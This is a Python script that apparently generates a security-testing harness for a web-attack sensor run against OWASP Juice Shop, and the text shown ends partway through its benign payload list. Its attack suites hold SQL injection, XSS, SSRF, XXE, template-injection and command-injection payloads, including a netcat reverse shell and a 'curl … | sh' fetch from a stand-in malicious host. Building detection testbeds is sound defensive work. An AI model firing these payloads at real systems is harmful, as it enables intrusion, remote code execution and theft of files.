import os
import json
import textwrap

BASE_DIR = '/home/mukund-thiru/Santh/testbed'
os.makedirs(os.path.join(BASE_DIR, 'src/payloads'), exist_ok=True)
os.makedirs(os.path.join(BASE_DIR, 'src/scenarios'), exist_ok=True)
os.makedirs(os.path.join(BASE_DIR, 'results'), exist_ok=True)

files = {}

files['package.json'] = """{
  "name": "santh-testbed",
  "version": "1.0.0",
  "description": "E2E security testing testbed for Santh edge-sensor",
  "main": "dist/index.js",
  "scripts": {
    "test": "ts-node src/harness.ts",
    "build": "tsc"
  },
  "dependencies": {
    "axios": "^1.6.0",
    "dotenv": "^16.3.1"
  },
  "devDependencies": {
    "@types/node": "^20.8.0",
    "ts-node": "^10.9.1",
    "typescript": "^5.2.2",
    "vitest": "^0.34.6"
  }
}"""

files['tsconfig.json'] = """{
  "compilerOptions": {
    "target": "ES2022",
    "module": "CommonJS",
    "rootDir": "./src",
    "outDir": "./dist",
    "esModuleInterop": true,
    "forceConsistentCasingInFileNames": true,
    "strict": true,
    "skipLibCheck": true,
    "resolveJsonModule": true
  },
  "include": ["src/**/*"]
}"""

files['docker-compose.yml'] = """version: '3.8'
services:
  juiceshop:
    image: bkimminich/juice-shop
    ports:
      - "3000:3000"
    restart: always
"""

files['wrangler.toml'] = """name = "santh-testbed"
main = "src/index.ts"
compatibility_date = "2023-10-30"

[vars]
UPSTREAM_URL = "http://localhost:3000"
TEST_MODE = "block"
SENSOR_ID = "testbed-sensor-1"
SEAL_SECRET = "testbed-secret-do-not-use-in-prod"
"""

files['.env.example'] = """SENSOR_ID=testbed-sensor-1
SEAL_SECRET=testbed-secret-do-not-use-in-prod
UPSTREAM_URL=http://localhost:3000
SENSOR_URL=http://localhost:8787
TEST_MODE=block
"""

files['README.md'] = """# Santh Testbed

E2E security testing testbed for the Santh edge-sensor against OWASP Juice Shop.

## Setup Instructions

1. Start Juice Shop:
   ```bash
   docker-compose up -d
   ```

2. Start the edge-sensor (in a separate terminal):
   ```bash
   cd ../invariant/packages/edge-sensor
   wrangler dev --port 8787
   ```

3. Install testbed dependencies:
   ```bash
   npm install
   ```

4. Run the testbed:
   ```bash
   npm test
   ```
"""

files['src/types.ts'] = """export interface Payload {
    id: string;
    payload: string;
    target: 'query' | 'header' | 'body' | 'cookie' | 'path';
    field: string;
    description: string;
    method?: 'GET' | 'POST' | 'PUT' | 'DELETE' | 'PATCH';
    path?: string;
    headers?: Record<string, string>;
}

export interface PayloadSuite {
    name: string;
    type: 'attack' | 'benign';
    payloads: Payload[];
}

export interface TestResult {
    payloadId: string;
    suiteName: string;
    type: 'attack' | 'benign';
    status: 'BLOCKED' | 'PASSED' | 'ERROR';
    latencyMs: number;
    errorMessage?: string;
    statusCode?: number;
}

export interface SuiteResult {
    suiteName: string;
    type: 'attack' | 'benign';
    results: TestResult[];
}

export interface DetectionReport {
    total_attacks: number;
    blocked_attacks: number;
    detection_rate: number;
    total_benign: number;
    blocked_benign: number;
    false_positive_rate: number;
    latency: {
        p50: number;
        p95: number;
        p99: number;
    };
    per_class: Record<string, {
        rate: number;
        count: number;
        total: number;
    }>;
}
"""

files['src/config.ts'] = """import * as dotenv from 'dotenv';
dotenv.config();

export const config = {
    SENSOR_URL: process.env.SENSOR_URL || 'http://localhost:8787',
    UPSTREAM_URL: process.env.UPSTREAM_URL || 'http://localhost:3000',
    TIMEOUT_MS: 10000,
    CONCURRENCY: 5
};
"""

files['src/oracle.ts'] = """import { Payload } from './types';

export function determineResult(status: number, data: any, headers: any, payload: Payload): 'BLOCKED' | 'PASSED' | 'ERROR' {
    if (status === 403 || status === 400 || (typeof data === 'string' && data.includes('INVARIANT'))) {
        return 'BLOCKED';
    }
    
    if (status >= 200 && status < 400) {
        return 'PASSED';
    }
    
    if (status >= 500) {
        return 'ERROR';
    }
    
    // Default fallback for 404, 401, etc. where it didn't explicitly block via the sensor
    return 'PASSED';
}
"""

files['src/reporter.ts'] = """import * as fs from 'fs';
import * as path from 'path';
import { SuiteResult, DetectionReport } from './types';

export function generateReport(results: SuiteResult[]): DetectionReport {
    let totalAttacks = 0;
    let blockedAttacks = 0;
    let totalBenign = 0;
    let blockedBenign = 0;
    
    const latencies: number[] = [];
    const perClass: Record<string, { rate: number, count: number, total: number }> = {};
    
    for (const suite of results) {
        let suiteTotal = 0;
        let suiteBlocked = 0;
        
        for (const res of suite.results) {
            latencies.push(res.latencyMs);
            
            if (res.type === 'attack') {
                totalAttacks++;
                suiteTotal++;
                if (res.status === 'BLOCKED') {
                    blockedAttacks++;
                    suiteBlocked++;
                }
            } else if (res.type === 'benign') {
                totalBenign++;
                if (res.status === 'BLOCKED') {
                    blockedBenign++;
                }
            }
        }
        
        if (suite.type === 'attack' && suiteTotal > 0) {
            perClass[suite.suiteName] = {
                rate: suiteBlocked / suiteTotal,
                count: suiteBlocked,
                total: suiteTotal
            };
        }
    }
    
    latencies.sort((a, b) => a - b);
    const p50 = latencies[Math.floor(latencies.length * 0.50)] || 0;
    const p95 = latencies[Math.floor(latencies.length * 0.95)] || 0;
    const p99 = latencies[Math.floor(latencies.length * 0.99)] || 0;
    
    const report: DetectionReport = {
        total_attacks: totalAttacks,
        blocked_attacks: blockedAttacks,
        detection_rate: totalAttacks > 0 ? blockedAttacks / totalAttacks : 0,
        total_benign: totalBenign,
        blocked_benign: blockedBenign,
        false_positive_rate: totalBenign > 0 ? blockedBenign / totalBenign : 0,
        latency: {
            p50,
            p95,
            p99
        },
        per_class: perClass
    };
    
    console.log('\\n======================================================');
    console.log('              SANTH TESTBED REPORT                    ');
    console.log('======================================================');
    console.log(`Overall Detection Rate:     ${(report.detection_rate * 100).toFixed(2)}% (${report.blocked_attacks}/${report.total_attacks})`);
    console.log(`Overall False Positives:    ${(report.false_positive_rate * 100).toFixed(2)}% (${report.blocked_benign}/${report.total_benign})`);
    console.log('\\n--- Latency ---');
    console.log(`p50: ${report.latency.p50}ms | p95: ${report.latency.p95}ms | p99: ${report.latency.p99}ms`);
    console.log('\\n--- Breakdown by Class ---');
    for (const [cls, stats] of Object.entries(report.per_class)) {
        console.log(`${cls.padEnd(25)} ${(stats.rate * 100).toFixed(2).padStart(6)}%  (${stats.count}/${stats.total})`);
    }
    console.log('======================================================\\n');
    
    const resultsDir = path.join(__dirname, '..', 'results');
    if (!fs.existsSync(resultsDir)) {
        fs.mkdirSync(resultsDir, { recursive: true });
    }
    
    fs.writeFileSync(
        path.join(resultsDir, 'latest.json'),
        JSON.stringify(report, null, 2)
    );
    
    return report;
}
"""

files['src/payloads/sqli.ts'] = """import { PayloadSuite } from '../types';

export const sqli: PayloadSuite = {
    name: 'sqli',
    type: 'attack',
    payloads: [
        { id: 'sqli-1', payload: "' OR 1=1 --", target: 'query', field: 'id', description: 'Classic tautology' },
        { id: 'sqli-2', payload: "admin' --", target: 'body', field: 'username', description: 'Admin login bypass' },
        { id: 'sqli-3', payload: "1'; DROP TABLE users--", target: 'query', field: 'id', description: 'Stacked queries' },
        { id: 'sqli-4', payload: "' UNION SELECT 1, @@version, 3, 4, 5 --", target: 'query', field: 'id', description: 'Union based' },
        { id: 'sqli-5', payload: "1 AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL)", target: 'query', field: 'id', description: 'Time based blind' },
        { id: 'sqli-6', payload: "1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT version())))", target: 'query', field: 'id', description: 'Error based' },
        { id: 'sqli-7', payload: "1 AND 1=1", target: 'query', field: 'id', description: 'Blind boolean true' },
        { id: 'sqli-8', payload: "1 AND 1=2", target: 'query', field: 'id', description: 'Blind boolean false' },
        { id: 'sqli-9', payload: "1 /*!50000UNION*/ /*!50000SELECT*/ 1,2,3", target: 'query', field: 'id', description: 'MySQL comment bypass' },
        { id: 'sqli-10', payload: "'; EXEC sp_executesql N'SELECT * FROM users'--", target: 'query', field: 'id', description: 'MSSQL execution' },
        { id: 'sqli-11', payload: "admin' OR '1'='1'/*", target: 'body', field: 'email', description: 'Juice Shop login bypass 1' },
        { id: 'sqli-12', payload: "' OR true --", target: 'body', field: 'email', description: 'Boolean based' },
        { id: 'sqli-13', payload: "\\") OR 1=1--", target: 'query', field: 'q', description: 'Double quote tautology' },
        { id: 'sqli-14', payload: "1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", target: 'query', field: 'id', description: 'Union nulls' },
        { id: 'sqli-15', payload: "1 ORDER BY 10--", target: 'query', field: 'id', description: 'Order by enum' },
        { id: 'sqli-16', payload: "1' AND (SELECT 8393 FROM (SELECT(SLEEP(5)))kIav) AND 'x'='x", target: 'query', field: 'id', description: 'Time based 2' },
        { id: 'sqli-17', payload: "1' AND (SELECT 1234 FROM(SELECT COUNT(*),CONCAT(0x7170766a71,(SELECT (ELT(1234=1234,1))),0x71716b6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'x'='x", target: 'query', field: 'id', description: 'Complex error based' },
        { id: 'sqli-18', payload: "admin' #", target: 'body', field: 'email', description: 'Hash comment bypass' },
        { id: 'sqli-19', payload: "admin')--", target: 'body', field: 'email', description: 'Paren comment bypass' },
        { id: 'sqli-20', payload: "1; WAITFOR DELAY '0:0:5'--", target: 'query', field: 'id', description: 'MSSQL sleep' }
    ]
};
"""

files['src/payloads/xss.ts'] = """import { PayloadSuite } from '../types';

export const xss: PayloadSuite = {
    name: 'xss',
    type: 'attack',
    payloads: [
        { id: 'xss-1', payload: "<script>alert(1)</script>", target: 'query', field: 'q', description: 'Classic script tag' },
        { id: 'xss-2', payload: "\\"><script>alert(document.cookie)</script>", target: 'query', field: 'q', description: 'Break out of attribute' },
        { id: 'xss-3', payload: "<img src=x onerror=alert(1)>", target: 'body', field: 'content', description: 'Image onerror' },
        { id: 'xss-4', payload: "<svg onload=alert(1)>", target: 'body', field: 'content', description: 'SVG onload' },
        { id: 'xss-5', payload: "javascript:alert(1)", target: 'query', field: 'url', description: 'Javascript pseudo protocol' },
        { id: 'xss-6', payload: "'-alert(1)-'", target: 'query', field: 'q', description: 'Context breakout' },
        { id: 'xss-7', payload: "\\\\\\";alert(1);//", target: 'query', field: 'q', description: 'JS string breakout' },
        { id: 'xss-8', payload: "{{constructor.constructor('alert(1)')()}}", target: 'query', field: 'q', description: 'AngularJS sandbox escape' },
        { id: 'xss-9', payload: "<body onload=alert(1)>", target: 'body', field: 'content', description: 'Body onload' },
        { id: 'xss-10', payload: "<iframe src=\\"javascript:alert(1)\\">", target: 'body', field: 'content', description: 'Iframe JS' },
        { id: 'xss-11', payload: "<details open ontoggle=alert(1)>", target: 'body', field: 'content', description: 'Details ontoggle' },
        { id: 'xss-12', payload: "<input autofocus onfocus=alert(1)>", target: 'body', field: 'content', description: 'Input autofocus' },
        { id: 'xss-13', payload: "<a href=\\"javascript:alert(1)\\">click</a>", target: 'body', field: 'content', description: 'Link JS' },
        { id: 'xss-14', payload: "<script>eval(atob('YWxlcnQoMSk='))</script>", target: 'query', field: 'q', description: 'Base64 eval' },
        { id: 'xss-15', payload: "<scr<script>ipt>alert(1)</script>", target: 'query', field: 'q', description: 'Nested script tags' },
        { id: 'xss-16', payload: "<SCRIPT>alert(1)</SCRIPT>", target: 'query', field: 'q', description: 'Case variation' },
        { id: 'xss-17', payload: "<img src=\\"x:x\\" onerror=\\"alert(1)\\">", target: 'body', field: 'content', description: 'Img varied onerror' },
        { id: 'xss-18', payload: "javascript://%250Aalert(1)", target: 'query', field: 'redirect', description: 'JS protocol newline bypass' },
        { id: 'xss-19', payload: "<math><mi>//</mi><script>alert(1)</script>", target: 'body', field: 'content', description: 'MathML mutation' },
        { id: 'xss-20', payload: "<object data=\\"javascript:alert(1)\\">", target: 'body', field: 'content', description: 'Object data JS' }
    ]
};
"""

files['src/payloads/ssrf.ts'] = """import { PayloadSuite } from '../types';

export const ssrf: PayloadSuite = {
    name: 'ssrf',
    type: 'attack',
    payloads: [
        { id: 'ssrf-1', payload: "http://localhost", target: 'query', field: 'url', description: 'Localhost basic' },
        { id: 'ssrf-2', payload: "http://127.0.0.1", target: 'query', field: 'url', description: '127.0.0.1 basic' },
        { id: 'ssrf-3', payload: "http://169.254.169.254/latest/meta-data/", target: 'query', field: 'url', description: 'AWS metadata' },
        { id: 'ssrf-4', payload: "http://metadata.google.internal/computeMetadata/v1/", target: 'query', field: 'url', description: 'GCP metadata' },
        { id: 'ssrf-5', payload: "file:///etc/passwd", target: 'query', field: 'url', description: 'File protocol' },
        { id: 'ssrf-6', payload: "dict://localhost:11211/stat", target: 'query', field: 'url', description: 'Dict protocol memcached' },
        { id: 'ssrf-7', payload: "gopher://localhost:6379/_INFO", target: 'query', field: 'url', description: 'Gopher protocol redis' },
        { id: 'ssrf-8', payload: "http://0.0.0.0", target: 'query', field: 'url', description: '0.0.0.0 bypass' },
        { id: 'ssrf-9', payload: "http://2130706433", target: 'query', field: 'url', description: 'Decimal IP bypass' },
        { id: 'ssrf-10', payload: "http://0x7f000001", target: 'query', field: 'url', description: 'Hex IP bypass' },
        { id: 'ssrf-11', payload: "http://127.1", target: 'query', field: 'url', description: 'Octal/short IP bypass' },
        { id: 'ssrf-12', payload: "http://localtest.me", target: 'query', field: 'url', description: 'DNS resolving to localhost' },
        { id: 'ssrf-13', payload: "http://[::]:80/", target: 'query', field: 'url', description: 'IPv6 localhost' },
        { id: 'ssrf-14', payload: "http://127.0.0.1.nip.io", target: 'query', field: 'url', description: 'nip.io bypass' },
        { id: 'ssrf-15', payload: "http://expected-host.com@127.0.0.1", target: 'query', field: 'url', description: 'Auth credential bypass' }
    ]
};
"""

files['src/payloads/cmdi.ts'] = """import { PayloadSuite } from '../types';

export const cmdi: PayloadSuite = {
    name: 'cmdi',
    type: 'attack',
    payloads: [
        { id: 'cmdi-1', payload: "; id", target: 'query', field: 'cmd', description: 'Semicolon separator' },
        { id: 'cmdi-2', payload: "| id", target: 'query', field: 'cmd', description: 'Pipe separator' },
        { id: 'cmdi-3', payload: "|| id", target: 'query', field: 'cmd', description: 'OR separator' },
        { id: 'cmdi-4', payload: "&& id", target: 'query', field: 'cmd', description: 'AND separator' },
        { id: 'cmdi-5', payload: "`id`", target: 'query', field: 'cmd', description: 'Backtick substitution' },
        { id: 'cmdi-6', payload: "$(id)", target: 'query', field: 'cmd', description: 'Dollar substitution' },
        { id: 'cmdi-7', payload: ";/bin/cat /etc/passwd", target: 'query', field: 'cmd', description: 'Read sensitive file' },
        { id: 'cmdi-8', payload: "|/bin/nc -e /bin/sh 10.0.0.1 4444", target: 'query', field: 'cmd', description: 'Reverse shell' },
        { id: 'cmdi-9', payload: "a;awk '{print $0}' /etc/passwd", target: 'query', field: 'cmd', description: 'Awk read' },
        { id: 'cmdi-10', payload: ";ping -c 3 127.0.0.1", target: 'query', field: 'cmd', description: 'Ping blind' },
        { id: 'cmdi-11', payload: ";sleep 5", target: 'query', field: 'cmd', description: 'Sleep blind' },
        { id: 'cmdi-12', payload: "foo$IFS;id", target: 'query', field: 'cmd', description: 'IFS bypass' },
        { id: 'cmdi-13', payload: ";wge\\\\t http://malicious.com/shell.sh", target: 'query', field: 'cmd', description: 'Escape bypass' },
        { id: 'cmdi-14', payload: ";curl -s http://malicious.com | sh", target: 'query', field: 'cmd', description: 'Curl pipe' },
        { id: 'cmdi-15', payload: "a|/bin/ls -la", target: 'query', field: 'cmd', description: 'List directory' }
    ]
};
"""

files['src/payloads/path-traversal.ts'] = """import { PayloadSuite } from '../types';

export const pathTraversal: PayloadSuite = {
    name: 'path-traversal',
    type: 'attack',
    payloads: [
        { id: 'pt-1', payload: "../../../../../etc/passwd", target: 'query', field: 'file', description: 'Classic relative path' },
        { id: 'pt-2', payload: "/etc/passwd", target: 'query', field: 'file', description: 'Absolute path' },
        { id: 'pt-3', payload: "..%2f..%2f..%2f..%2fetc%2fpasswd", target: 'query', field: 'file', description: 'URL encoded' },
        { id: 'pt-4', payload: "..%252f..%252f..%252fetc%252fpasswd", target: 'query', field: 'file', description: 'Double URL encoded' },
        { id: 'pt-5', payload: "....//....//....//etc/passwd", target: 'query', field: 'file', description: 'Filter bypass' },
        { id: 'pt-6', payload: "..\\\\..\\\\..\\\\windows\\\\win.ini", target: 'query', field: 'file', description: 'Windows traversal' },
        { id: 'pt-7', payload: "%c0%af%c0%af%c0%af%c0%afetc%c0%afpasswd", target: 'query', field: 'file', description: 'Unicode encoding' },
        { id: 'pt-8', payload: "C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts", target: 'query', field: 'file', description: 'Windows absolute path' },
        { id: 'pt-9', payload: "///etc//passwd", target: 'query', field: 'file', description: 'Multiple slashes' },
        { id: 'pt-10', payload: "/var/www/html/../../../etc/passwd", target: 'query', field: 'file', description: 'Valid prefix traversal' },
        { id: 'pt-11', payload: "....\\\\/....\\\\/....\\\\/etc/passwd", target: 'query', field: 'file', description: 'Mixed slash traversal' },
        { id: 'pt-12', payload: "..%c0%af..%c0%af..%c0%afetc/passwd", target: 'query', field: 'file', description: 'Mixed encoding traversal' },
        { id: 'pt-13', payload: "/etc/passwd%00", target: 'query', field: 'file', description: 'Null byte termination' },
        { id: 'pt-14', payload: "../../../../../etc/passwd%00.jpg", target: 'query', field: 'file', description: 'Extension bypass' },
        { id: 'pt-15', payload: ".....///.....///.....///etc/passwd", target: 'query', field: 'file', description: 'Deep filter bypass' }
    ]
};
"""

files['src/payloads/auth.ts'] = """import { PayloadSuite } from '../types';

export const auth: PayloadSuite = {
    name: 'auth',
    type: 'attack',
    payloads: [
        { id: 'auth-1', payload: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.", target: 'header', field: 'Authorization', description: 'JWT none algorithm' },
        { id: 'auth-2', payload: "admin' OR 1=1--", target: 'body', field: 'password', description: 'SQLi password bypass' },
        { id: 'auth-3', payload: "true", target: 'body', field: 'isAdmin', description: 'Mass assignment isAdmin' },
        { id: 'auth-4', payload: "1", target: 'body', field: 'role_id', description: 'Mass assignment role' },
        { id: 'auth-5', payload: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.", target: 'header', field: 'Authorization', description: 'JWT weak signature' },
        { id: 'auth-6', payload: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.invalid_signature", target: 'header', field: 'Authorization', description: 'JWT invalid signature' },
        { id: 'auth-7', payload: "Bearer null", target: 'header', field: 'Authorization', description: 'Null token' },
        { id: 'auth-8', payload: "Bearer undefined", target: 'header', field: 'Authorization', description: 'Undefined token' },
        { id: 'auth-9', payload: "Basic YWRtaW46YWRtaW4=", target: 'header', field: 'Authorization', description: 'Basic auth default creds' },
        { id: 'auth-10', payload: "admin", target: 'body', field: 'username', description: 'Username enumeration' },
        { id: 'auth-11', payload: "{}", target: 'body', field: 'password', description: 'Object injection password' },
        { id: 'auth-12', payload: "[]", target: 'body', field: 'password', description: 'Array injection password' },
        { id: 'auth-13', payload: "admin", target: 'cookie', field: 'session', description: 'Forged session cookie' },
        { id: 'auth-14', payload: "1", target: 'cookie', field: 'user_id', description: 'IDOR in cookie' },
        { id: 'auth-15', payload: "0", target: 'body', field: 'otp', description: 'OTP bypass zero' }
    ]
};
"""

files['src/payloads/ssti.ts'] = """import { PayloadSuite } from '../types';

export const ssti: PayloadSuite = {
    name: 'ssti',
    type: 'attack',
    payloads: [
        { id: 'ssti-1', payload: "{{7*7}}", target: 'query', field: 'name', description: 'Basic Jinja/Twig evaluation' },
        { id: 'ssti-2', payload: "${7*7}", target: 'query', field: 'name', description: 'Java EL / JSP evaluation' },
        { id: 'ssti-3', payload: "<%= 7*7 %>", target: 'query', field: 'name', description: 'ERB / ASP evaluation' },
        { id: 'ssti-4', payload: "${{7*7}}", target: 'query', field: 'name', description: 'Vue/Angular evaluation' },
        { id: 'ssti-5', payload: "{{''.__class__.__mro__[2].__subclasses__()}}", target: 'query', field: 'name', description: 'Python Jinja2 RCE gadget' },
        { id: 'ssti-6', payload: "#{7*7}", target: 'query', field: 'name', description: 'Spring EL evaluation' },
        { id: 'ssti-7', payload: "*{7*7}", target: 'query', field: 'name', description: 'Thymeleaf evaluation' },
        { id: 'ssti-8', payload: "<#assign ex=\\"freemarker.template.utility.Execute\\"?new()> ${ ex(\\"id\\") }", target: 'query', field: 'name', description: 'FreeMarker RCE' },
        { id: 'ssti-9', payload: "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}", target: 'query', field: 'name', description: 'Jinja2 RCE' },
        { id: 'ssti-10', payload: "{{@java.lang.Runtime@getRuntime().exec('id')}}", target: 'query', field: 'name', description: 'Java Velocity RCE' }
    ]
};
"""

files['src/payloads/xxe.ts'] = """import { PayloadSuite } from '../types';

export const xxe: PayloadSuite = {
    name: 'xxe',
    type: 'attack',
    payloads: [
        { id: 'xxe-1', payload: "<?xml version=\\"1.0\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \\"file:///etc/passwd\\">]><foo>&xxe;</foo>", target: 'body', field: 'xml', description: 'Basic XXE file read' },
        { id: 'xxe-2', payload: "<?xml version=\\"1.0\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \\"http://169.254.169.254/latest/meta-data/\\">]><foo>&xxe;</foo>", target: 'body', field: 'xml', description: 'XXE SSRF AWS' },
        { id: 'xxe-3', payload: "<?xml version=\\"1.0\\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \\"http://malicious.com/evil.dtd\\"> %xxe;]><foo>&evil;</foo>", target: 'body', field: 'xml', description: 'Parameter entity XXE' },
        { id: 'xxe-4', payload: "<?xml version=\\"1.0\\"?><foo xmlns:xi=\\"http://www.w3.org/2001/XInclude\\"><xi:include href=\\"file:///etc/passwd\\" parse=\\"text\\"/></foo>", target: 'body', field: 'xml', description: 'XInclude file read' },
        { id: 'xxe-5', payload: "<?xml version=\\"1.0\\" encoding=\\"UTF-16\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \\"file:///etc/passwd\\">]><foo>&xxe;</foo>", target: 'body', field: 'xml', description: 'UTF-16 encoded XXE' },
        { id: 'xxe-6', payload: "<!DOCTYPE root [<!ENTITY % remote SYSTEM \\"http://malicious.com/xxe.dtd\\">%remote;]><root/>", target: 'body', field: 'xml', description: 'Blind XXE out-of-band' },
        { id: 'xxe-7', payload: "<?xml version=\\"1.0\\"?><!DOCTYPE root [<!ENTITY test SYSTEM \\"expect://id\\">]><root>&test;</root>", target: 'body', field: 'xml', description: 'XXE PHP expect RCE' },
        { id: 'xxe-8', payload: "<?xml version=\\"1.0\\"?><!DOCTYPE data [<!ENTITY % file SYSTEM \\"file:///etc/passwd\\"><!ENTITY % dtd SYSTEM \\"http://malicious.com/evil.dtd\\">%dtd;%all;]><data/>", target: 'body', field: 'xml', description: 'Error-based XXE' },
        { id: 'xxe-9', payload: "<?xml version=\\"1.0\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \\"file:///dev/random\\">]><foo>&xxe;</foo>", target: 'body', field: 'xml', description: 'XXE DoS' },
        { id: 'xxe-10', payload: "<svg xmlns=\\"http://www.w3.org/2000/svg\\" xmlns:xlink=\\"http://www.w3.org/1999/xlink\\" width=\\"300\\" version=\\"1.1\\" height=\\"200\\"><image xlink:href=\\"expect://id\\"></image></svg>", target: 'body', field: 'xml', description: 'SVG XXE' }
    ]
};
"""

files['src/payloads/proto-pollution.ts'] = """import { PayloadSuite } from '../types';

export const protoPollution: PayloadSuite = {
    name: 'proto-pollution',
    type: 'attack',
    payloads: [
        { id: 'pp-1', payload: "{\\"__proto__\\": {\\"isAdmin\\": true}}", target: 'body', field: 'raw', description: 'Basic proto pollution' },
        { id: 'pp-2', payload: "{\\"constructor\\": {\\"prototype\\": {\\"isAdmin\\": true}}}", target: 'body', field: 'raw', description: 'Constructor prototype pollution' },
        { id: 'pp-3', payload: "admin", target: 'query', field: '__proto__[isAdmin]', description: 'Query string proto pollution' },
        { id: 'pp-4', payload: "admin", target: 'query', field: 'constructor[prototype][isAdmin]', description: 'Query string constructor pollution' },
        { id: 'pp-5', payload: "{\\"__proto__\\": {\\"polluted\\": \\"yes\\"}}", target: 'body', field: 'raw', description: 'Generic attribute pollution' },
        { id: 'pp-6', payload: "{\\"__proto__\\": {\\"env\\": {\\"NODE_OPTIONS\\": \\"--inspect=0.0.0.0\\"}}}", target: 'body', field: 'raw', description: 'Env var pollution' },
        { id: 'pp-7', payload: "{\\"__proto__\\": {\\"src\\": \\"data:text/javascript,alert(1)\\"}}", target: 'body', field: 'raw', description: 'Script src pollution' },
        { id: 'pp-8', payload: "{\\"__proto__\\": {\\"cookie\\": \\"session=admin\\"}}", target: 'body', field: 'raw', description: 'Cookie pollution' },
        { id: 'pp-9', payload: "{\\"__proto__\\": {\\"allow\\": true}}", target: 'body', field: 'raw', description: 'Auth bypass pollution' },
        { id: 'pp-10', payload: "{\\"__proto__\\": {\\"shell\\": \\"node\\"}}", target: 'body', field: 'raw', description: 'Command exec pollution' }
    ]
};
"""

files['src/payloads/benign.ts'] = """import { PayloadSuite } from '../types';

export const benign: PayloadSuite = {
    name: 'benign',
    type: 'benign',
    payloads: [
        { id: 'benign-1', payload: "apple", target: 'query', field: 'q', description: 'Simple product search' },
        { id: 'benign-2', payload: "juice box", target: 'query', field: 'q', description: 'Product search with space' },
        { id: 'benign-3', payload: "user@example.com", target: 'body', field: 'email', description: 'Valid email login' },
        { id: 'benign-4', payload: "SecurePass123!", target: 'body', field: 'password', description: 'Complex password' },
        { id: 'benign-5', payload: "John Doe", target: 'body', field: 'name', description: 'Normal name' },
        { id: 'benign-6', payload: "123 Main St, Springfield, IL 62701", target: 'body', field: 'address', description: 'Normal address' },
        { id: 'benign-7', payload: "Great product, I love it!", target: 'body', field: 'review', description: 'Normal review text' },
        { id: 'benign-8', payload: "{\\"items\\":[{\\"id\\":1,\\"qty\\":2}],\\"coupon\\":\\"SAVE20\\"}", target: 'body', field: 'raw', description: 'Shopping cart JSON' },
        { id: 'benign-9', payload: "5", target: 'body', field: 'rating', description: 'Numeric rating' },
        { id: 'benign-10', payload: "https://example.com/callback", target: 'query', field: 'redirect_uri', description: 'Valid redirect URI' },
        { id: 'benign-11', payload: "en-US", target: 'header', field: 'Accept-Language', description: 'Standard language header' },
        { id: 'benign-12', payload: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36", target: 'header', field: 'User-Agent', description: 'Standard User-Agent' },
        { id: 'benign-13', payload: "application/json", target: 'header', field: 'Content-Type', description: 'Standard Content-Type' },
        { id: 'benign-14', payload: "session=1234567890abcdef", target: 'cookie', field: 'Cookie', description: 'Standard session cookie' },
        { id: 'benign-15', payload: "1", target: 'path', field: 'id', description: 'Numeric ID in path', path: '/api/Products/1' },
        { id: 'benign-16', payload: "O'Connor", target: 'body', field: 'lastName', description: 'Name with apostrophe' },
        { id: 'benign-17', payload: "C/C++ Programming", target: 'query', field: 'category', description: 'Search with slashes' },
        { id: 'benign-18', payload: "100%", target: 'query', field: 'discount', description: 'Text with percent sign' },
        { id: 'benign-19', payload: "var x = 10; // code snippet discussion", target: 'body', field: 'comment', description: 'Code snippet in forum' },
        { id: 'benign-20', payload: "<p>Formatted text</p>", target: 'body', field: 'description', description: 'Allowed safe HTML' },
        { id: 'benign-21', payload: "user.name", target: 'query', field: 'sort', description: 'Sort by field with dot' },
        { id: 'benign-22', payload: "admin-user", target: 'body', field: 'username', description: 'Username with dash' },
        { id: 'benign-23', payload: "file.txt", target: 'body', field: 'filename', description: 'Normal filename' },
        { id: 'benign-24', payload: "1.2.3.4", target: 'body', field: 'ip', description: 'Normal IP address input' },
        { id: 'benign-25', payload: "2023-10-30T12:00:00Z", target: 'query', field: 'date', description: 'ISO date string' },
        { id: 'benign-26', payload: "SELECT * FROM users", target: 'body', field: 'sql_tutorial', description: 'SQL tutorial content' },
        { id: 'benign-27', payload: "alert('hello')", target: 'body', field: 'js_tutorial', description: 'JS tutorial content' },
        { id: 'benign-28', payload: "{\\"settings\\": {\\"theme\\": \\"dark\\"}}", target: 'body', field: 'preferences', description: 'JSON preferences' },
        { id: 'benign-29', payload: "page=1&size=20", target: 'body', field: 'raw', description: 'Form data' },
        { id: 'benign-30', payload: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...", target: 'header', field: 'Authorization', description: 'Valid JWT format' },
        { id: 'benign-31', payload: "cors", target: 'header', field: 'Sec-Fetch-Mode', description: 'Standard fetch header' },
        { id: 'benign-32', payload: "image/webp,image/apng,*/*;q=0.8", target: 'header', field: 'Accept', description: 'Standard accept header' },
        { id: 'benign-33', payload: "UTF-8", target: 'header', field: 'Accept-Charset', description: 'Standard charset header' },
        { id: 'benign-34', payload: "keep-alive", target: 'header', field: 'Connection', description: 'Standard connection header' },
        { id: 'benign-35', payload: "https://www.google.com/", target: 'header', field: 'Referer', description: 'Standard referer' },
        { id: 'benign-36', payload: "123456789", target: 'body', field: 'phone', description: 'Phone number' },
        { id: 'benign-37', payload: "12.34", target: 'body', field: 'price', description: 'Decimal price' },
        { id: 'benign-38', payload: "true", target: 'body', field: 'subscribe', description: 'Boolean flag' },
        { id: 'benign-39', payload: "null", target: 'body', field: 'optional_field', description: 'Null value' },
        { id: 'benign-40', payload: "['item1', 'item2']", target: 'body', field: 'tags', description: 'Array of strings' },
        { id: 'benign-41', payload: "a".repeat(100), target: 'body', field: 'long_text', description: 'Long text input' },
        { id: 'benign-42', payload: "½", target: 'body', field: 'special_char', description: 'Special character' },
